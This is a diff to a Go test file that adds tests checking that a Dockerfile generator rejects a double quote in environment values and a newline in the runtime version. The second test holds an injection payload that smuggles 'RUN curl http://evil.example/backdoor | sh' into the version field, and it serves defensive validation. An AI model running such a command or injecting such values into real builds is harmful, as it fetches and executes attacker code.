@@ -436,6 +436,26 @@ func TestGenerateDockerfileSandboxEnvNewlineRejected(t *testing.T) {
 	}
 }
 
+func TestGenerateDockerfileSandboxEnvDoubleQuoteRejected(t *testing.T) {
+	cfg := DefaultDockerConfig()
+	cfg.SandboxEnv = map[string]string{"FOO": `bar"baz`}
+
+	_, err := GenerateDockerfile(cfg, slog.Default())
+	if err == nil {
+		t.Fatal("expected error for SandboxEnv value containing double quote, got nil")
+	}
+}
+
+func TestGenerateDockerfileRuntimeVersionNewlineRejected(t *testing.T) {
+	cfg := DefaultDockerConfig()
+	cfg.Runtime = config.Runtime{Name: "flutter", Version: "stable\nRUN curl http://evil.example/backdoor | sh"}
+
+	_, err := GenerateDockerfile(cfg, slog.Default())
+	if err == nil {
+		t.Fatal("expected error for Runtime.Version containing newline, got nil")
+	}
+}
+
 func TestGenerateDockerfileClaudeCodeAlwaysPresent(t *testing.T) {
 	runtimes := []config.Runtime{
 		{Name: "go", Version: "1.26.0"},
